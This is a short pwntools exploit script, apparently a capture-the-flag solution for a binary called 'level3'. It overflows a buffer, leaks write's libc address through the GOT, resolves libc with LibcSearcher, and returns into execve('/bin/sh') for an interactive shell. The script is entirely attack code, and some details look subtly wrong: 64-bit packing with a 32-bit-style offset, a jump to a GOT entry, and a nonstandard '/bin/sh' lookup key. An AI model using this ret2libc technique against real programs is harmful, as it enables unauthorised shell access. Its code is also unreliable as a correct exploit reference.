from pwn import *
from LibcSearcher import *
io = process('./level3')
elf = ELF('./level3')
#io = remote('node4.buuoj.cn',27883)
padding = b'a'*(136+4)
got_write = elf.got['write']
def leak():
    payload1 = padding+p64(got_write)+p64(1)+p64(got_write)+p64(0x8)
    io.send(payload1)
    sleep(1)
io.recvuntil('Input:\n')
leak()
libc_write = u64(io.recv(8))
libc = LibcSearcher('write',libc_write)
libc_base = libc_write-libc.dump('write')
execve_addr = libc_base + libc.dump('execve')
bin_addr = libc_base + libc.dump('/bin/sh')

def pwn():
    payload2 = padding+p64(execve_addr)+p64(bin_addr)
    io.send(payload2)
pwn()
io.interactive()
